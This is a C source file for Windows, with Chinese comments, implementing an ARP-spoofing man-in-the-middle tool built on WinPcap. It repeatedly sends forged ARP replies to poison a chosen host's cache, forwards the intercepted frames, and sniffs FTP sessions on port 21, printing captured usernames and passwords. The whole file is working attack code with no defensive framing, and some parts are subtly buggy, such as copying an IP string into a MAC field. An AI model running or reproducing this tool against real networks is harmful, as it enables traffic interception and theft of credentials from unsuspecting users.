#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <pcap.h>
#include <conio.h>
#include <winsock2.h>
#include <iphlpapi.h>

#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib,"Iphlpapi.lib")
#pragma comment(lib,"pcap.lib")

typedef struct DLC_Header
{
    unsigned char DesMAC[6];     //以太网目的地址
    unsigned char SrcMAC[6];     //以太网源地址
    unsigned short EtherType;    //帧类型
} DLCHEADER;

typedef struct ARP_Frame
{
    unsigned short HW_Type;       //硬件类型
    unsigned short Prot_Type;     //上层协议类型
    unsigned char HW_Addr_Len;    //MAC地址长度
    unsigned char Prot_Addr_Len;  //IP地址长度
    unsigned short Opcode;        //操作码,01表示请求，02表示应答

    unsigned char Send_HW_Addr[6]; //发送端MAC地址
    unsigned char Send_Prot_Addr[4];   //发送端IP地址
    unsigned char Targ_HW_Addr[6]; //目标MAC地址
    unsigned char Targ_Prot_Addr[4];   //目标IP地址
} ARPFRAME;

typedef struct ipheader
{
    unsigned char ip_hl:4;         /*header length(报头长度）*/
    unsigned char ip_v:4;          /*version(版本)*/
    unsigned char ip_tos;          /*type os service服务类型*/
    unsigned short int ip_len;     /*total length (总长度)*/
    unsigned short int ip_id;      /*identification (标识符)*/
    unsigned short int ip_off;     /*fragment offset field(段移位域)*/
    unsigned char ip_ttl;          /*time to live (生存时间)*/
    unsigned char ip_p;            /*protocol(协议)*/
    unsigned short int ip_sum;     /*checksum(校验和)*/
    unsigned char ip_src[4];       /*source address(源地址)*/
    unsigned char ip_dst[4];       /*destination address(目的地址)*/
} IP;

typedef struct tcpheader
{
    unsigned short int sport;    /*source port (源端口号)*/
    unsigned short int dport;    /*destination port(目的端口号)*/
    unsigned int th_seq;         /*sequence number(包的序列号)*/
    unsigned int th_ack;         /*acknowledgement number(确认应答号)*/
    unsigned char th_x:4;        /*unused(未使用)*/
    unsigned char th_off:4;      /*data offset(数据偏移量)*/
    unsigned char Flags;         /*标志全*/
    unsigned short int th_win;   /*windows(窗口)*/
    unsigned short int th_sum;   /*checksum(校验和)*/
    unsigned short int th_urp;   /*urgent pointer(紧急指针)*/
} TCP;

typedef struct
{
    pcap_t *hpcap;                        //网卡描述字
    unsigned char myIP[4];                //本机IP
    unsigned char myMAC[6];               //本机MAC
    unsigned char srcIP[4];               //来源IP
    unsigned char srcMAC[6];              //源MAC
    unsigned char desMAC[6];              //目标MAC
    unsigned char desIP[4];               //目标IP
    char **Packet;                         //数据包指针
    struct pcap_pkthdr pkthdr;            //储存数据包大小
} PacketInfo;

BOOL GetAdapterMAC(char *ipbuff,char *macbuff)
{
    IP_ADAPTER_INFO AdapterInfo[16];  //定义存储网卡信息的结构数组
    DWORD ArrayLength=sizeof(AdapterInfo);  //缓冲区长度
    if(GetAdaptersInfo(AdapterInfo,&ArrayLength)!=ERROR_SUCCESS)
        return ERROR;
    PIP_ADAPTER_INFO PAdapterInfo=AdapterInfo;

    do
    {
        if(!strcmp(ipbuff,PAdapterInfo->IpAddressList.IpAddress.String)) break;
        PAdapterInfo=PAdapterInfo->Next;
    }
    while(PAdapterInfo);

    memset(macbuff,NULL,6);
    memcpy(macbuff,PAdapterInfo->Address,6);         //获取网卡MAC地址

    return TRUE;
}

char *iptos(u_long in)
{
    static char output[12][3*4+3+1];
    static short which;
    u_char *p;

    p = (u_char *)&in;
    which = (which + 1 == 12 ? 0 : which + 1);
    sprintf(output[which], "%d.%d.%d.%d", p[0], p[1], p[2], p[3]);
    return output[which];
}

BOOL ChooseDev(char *devbuff,int buffsize,char *ipbuff)
{
    pcap_if_t *alldevs=NULL,*p=NULL;
    char errbuff[PCAP_ERRBUF_SIZE];
    int i,choose;
    pcap_addr_t *a=NULL;

    memset(devbuff,NULL,buffsize);

    if(pcap_findalldevs(&alldevs,errbuff)!=0)
        return ERROR;

    for(p=alldevs,i=0; p; p=p->next)
    {
        printf("%d.%s(%s)\n",++i,p->name,p->description);
        if((a=p->addresses))
        {
            switch(a->addr->sa_family)
            {
            case AF_INET:
                printf("Address Family Name: AF_INET\n");
                if (a->addr)
                    /* Y- IP 地址 */
                    printf("Address: %s\n",iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
                if (a->netmask)
                    /* Y- 掩码 */
                    printf("Netmask: %s\n",iptos(((struct sockaddr_in *)a->netmask)->sin_addr.s_addr));
                break;
            default:
                /* 未知 */
                printf("Address Family Name: Unknown\n");
                break;
            }
        }
        printf("------------------------------------------------------\n");
    }

    do
    {
        printf("请选择一个网卡:");
        fflush(stdin);
    }
    while(scanf("%d",&choose)!=1 || choose<1 ||choose>i);

    for(p=alldevs,i=1; i!=choose; p=p->next,i++);
    strcat(devbuff,p->name);
    memset(ipbuff,NULL,15);
    a=p->addresses;
    strcat(ipbuff,iptos(((struct sockaddr_in *)a->addr)->sin_addr.s_addr));
    pcap_freealldevs(alldevs);

    return TRUE;
}

void Fill_ARPPACKET(char *ARPPacket,int packetsize,char *desmac,char *desIP,char *srcmac,char *srcip,int op)
{
    /*
        *ARPPacket    指向将要填充的数据包指针
         packetsize   数据包大小
        *desmac 指向存有目标MAC的缓冲区地址
        *desIP  指向存有目标IP的缓冲区地址
        *srcmac 指向存有来源MAC的缓冲区地址
        *srcip  指向存有来源IP的缓冲区地址
         op     ARP包类型
        */
    DLCHEADER *DLCHeader=(DLCHEADER *)ARPPacket;
    ARPFRAME *ARPFrame=(ARPFRAME *)(ARPPacket+sizeof(DLCHEADER));
    memset(ARPPacket,NULL,packetsize);  //清空包内容
//填充以太网目的地址
    if(op==1)    //表示ARP请求包.
    {
        memset(DLCHeader->DesMAC,0xff,6);    //用ffffffffffff填充以太网头目的MAC地址。
        memset(ARPFrame->Targ_Prot_Addr,NULL,4);
        memset(ARPFrame->Targ_HW_Addr,NULL,6);
    }
    else
    {
        memcpy(DLCHeader->DesMAC,desmac,6);
        memcpy(ARPFrame->Targ_Prot_Addr,desIP,4);
        memcpy(ARPFrame->Targ_HW_Addr,DLCHeader->DesMAC,6);
    }

    //填充以太网源地址
    memcpy(DLCHeader->SrcMAC,srcmac,6);
    memcpy(ARPFrame->Send_HW_Addr,srcmac,6);
    //填充ARP包源IP
    memcpy(ARPFrame->Send_Prot_Addr,srcip,4);
    DLCHeader->EtherType=htons((unsigned short)0x0806);    //0x0806表示ARP协议，0x0800表示IP协议
    ARPFrame->HW_Addr_Len=(unsigned char)6;
    ARPFrame->Prot_Addr_Len=(unsigned char)4;
    ARPFrame->HW_Type=htons((unsigned short)1);
    ARPFrame->Opcode=htons((unsigned short)op);   //01表示请求，02表示应答
    ARPFrame->Prot_Type=htons((unsigned short)0x0800);
}

typedef struct
{
    //存放嗅探到的数据
    char srcip[16];
    char desip[16];
    char username[50];
    char password[50];
} Sniffer_Result;

void FTP_Sniffer(char *Packet,int packetsize)
{
    static Sniffer_Result result= {0};
    IP *IPHeader=(IP *)Packet;
    TCP *TCPHeader=(TCP *)(Packet+sizeof(IP));
    char *data=(char *)(Packet+sizeof(IP)+sizeof(TCP));
    Packet[packetsize-2]=NULL;
    char *p=NULL;

    if(strlen(data)>4 && (p=strstr(data,"USER")))
    {
        if(strlen(result.username)<1)
        {
            strcat(result.srcip,inet_ntoa(*(struct in_addr *)IPHeader->ip_src));
            strcat(result.desip,inet_ntoa(*(struct in_addr *)IPHeader->ip_dst));
            strcat(result.username,p+5);
        }
    }
    if(strlen(data)>4 && (p=strstr(data,"PASS")))
    {
        if(strlen(result.username)>0)
        {
            strcat(result.password,p+5);
            printf("FTP:\n来源地址:%s\n目标地址:%s\nUSER:%s\nPASS:%s\n",result.srcip,result.desip,\
                   result.username,result.password);
            printf("--------------------------------------------------------\n");
        }
        memset(&result,NULL,sizeof(Sniffer_Result));
    }

    return;
}

DWORD WINAPI filter(PVOID Parameter)
{
    BOOL SendPacket(pcap_t *hpcap,char *Packet,int packetsize);
    PacketInfo PI=*(PacketInfo *)Parameter;
    char *Packet=NULL;

    if((Packet=(char *)malloc(PI.pkthdr.caplen*sizeof(char)))==NULL) return -1;
    memcpy(Packet,*PI.Packet,PI.pkthdr.caplen);
    *PI.Packet=NULL;

    DLCHEADER *DLCHeader=NULL;
    IP *IPHeader=NULL;
    TCP *TCPHeader=NULL;

    DLCHeader=(DLCHEADER *)Packet;
    IPHeader=(IP *)(Packet+sizeof(DLCHEADER));
    TCPHeader=(TCP *)(Packet+sizeof(DLCHEADER)+sizeof(IP));

    if(!strncmp(DLCHeader->SrcMAC,PI.srcMAC,6) && !strncmp(DLCHeader->DesMAC,PI.myMAC,6))
    {
        memcpy(DLCHeader->DesMAC,PI.desMAC,6);
        SendPacket(PI.hpcap,Packet,PI.pkthdr.caplen);    //转发数据包
    }

    //检测帧中数据协议类型
    if(ntohs(DLCHeader->EtherType)==0x0800 && IPHeader->ip_p==0x06)
    {
        if(ntohs(TCPHeader->dport)==21) FTP_Sniffer(IPHeader,PI.pkthdr.caplen-sizeof(DLCHEADER));   //捕获到FTP数据包
    }
    free(Packet);

    return 0;
}

DWORD WINAPI Ether_Sniffer(PVOID Parameter)
{
    PacketInfo PI=*(PacketInfo *)Parameter;
    pcap_t *hpcap=PI.hpcap;
    struct pcap_pkthdr *pkthdr=NULL;
    char *recvBuff;
    HANDLE hFilterThread;

    while(TRUE)
    {
        if(pcap_next_ex(hpcap,&pkthdr,&recvBuff)>0)
        {
            PI.Packet=&recvBuff;
            PI.pkthdr=*pkthdr;
            CloseHandle((hFilterThread=CreateThread(NULL,0,filter,(PVOID)&PI,0,NULL)));
            while(recvBuff);
        }
    }

    return 0;
}

BOOL SendPacket(pcap_t *hpcap,char *Packet,int packetsize)
{
    if(pcap_sendpacket(hpcap,Packet,packetsize)!=0)
    {
        printf("数据包发送失败。\n");
        return ERROR;
    }
    return TRUE;
}


pcap_t *OpenAdapter(char *devName)
{
    pcap_t *hpcap=NULL;
    char errbuf[PCAP_ERRBUF_SIZE];

    if((hpcap=pcap_open_live(devName,        // 设备名
                             65536,          // 指定要捕捉的数据包的部分,65536 保证所有在链路层上的包都能够被抓到
                             1,    		     // 混杂模式
                             1000,         	 // 读数据的超时时间
                             errbuf          // 错误缓冲区
                            ))==NULL)
    {
        printf("打开网卡出错。\n");
        return NULL;
    }
    return hpcap;
}
//A>>>>>单向欺骗>>>>>>B
void Input(char *A_MAC,char *A_IP,char *B_MAC,char *B_IP)
{
    printf("A>>>>>单向欺骗>>>>>>B\n");
    printf("请输入A主机的MAC:");
    fflush(stdin);
    if(scanf("%x-%x-%x-%x-%x-%x",&A_MAC[0],&A_MAC[1],&A_MAC[2],&A_MAC[3],&A_MAC[4],&A_MAC[5])!=6) exit(-1);
    printf("请输入A主机的IP:");
    fflush(stdin);
    gets(A_IP);

    printf("请输入B主机的MAC:");
    fflush(stdin);
    if(scanf("%x-%x-%x-%x-%x-%x",&B_MAC[0],&B_MAC[1],&B_MAC[2],&B_MAC[3],&B_MAC[4],&B_MAC[5])!=6) exit(-1);
    printf("请输入B主机的IP:");
    fflush(stdin);
    gets(B_IP);
}

int main(int argc,char *argv[])
{
    char devName[100];
    char myIPAddress[15],myMAC[6];
    char ARPPacket[42];
    char A_IP[15]= {0},A_MAC[6]= {0};
    char B_IP[15]= {0},B_MAC[6]= {0};
    pcap_t *hpcap=NULL;
    HANDLE hSnifferThread;
    PacketInfo PI;
    unsigned long A_addr,B_addr;

    if(ChooseDev(devName,sizeof(devName),myIPAddress)!=TRUE)
    {
        printf("获取网卡失败。\n");
        getch();
        return -1;
    }
    //获取本机网卡MAC
    if(GetAdapterMAC(myIPAddress,myMAC)!=TRUE)
    {
        printf("获取网卡MAC失败。\n");
        getch();
        return -1;
    }
    //打开网卡
    if((hpcap=OpenAdapter(devName))==NULL)
    {
        printf("网卡打开出错。\n");
        getch();
        return -1;
    }

    //输入欺骗主机信息    A>>>>>单向欺骗>>>>>>B
    Input(A_MAC,A_IP,B_MAC,B_IP);
    A_addr=inet_addr(A_IP);
    B_addr=inet_addr(B_IP);
    //以ARP应答的方式欺骗主机A
    Fill_ARPPACKET(ARPPacket,sizeof(ARPPacket),A_MAC,(char *)&A_addr,myMAC,(char *)&B_addr,2);

    //填充传递参数
    PI.hpcap=hpcap;
    memcpy(PI.srcMAC,A_IP,6);
    memcpy(PI.desIP,(char *)&B_addr,4);
    memcpy(PI.desMAC,B_MAC,6);
    memcpy(PI.srcIP,(char *)&A_addr,4);
    memcpy(PI.myIP,myIPAddress,4);
    memcpy(PI.myMAC,myMAC,6);
    //开启嗅探线程
    CloseHandle((hSnifferThread=CreateThread(NULL,0,Ether_Sniffer,(PVOID)&PI,0,NULL)));

    while(1)
    {
        Sleep(1000);
        SendPacket(hpcap,ARPPacket,sizeof(ARPPacket));   //发送ARP欺骗包
    }

    return 0;
}
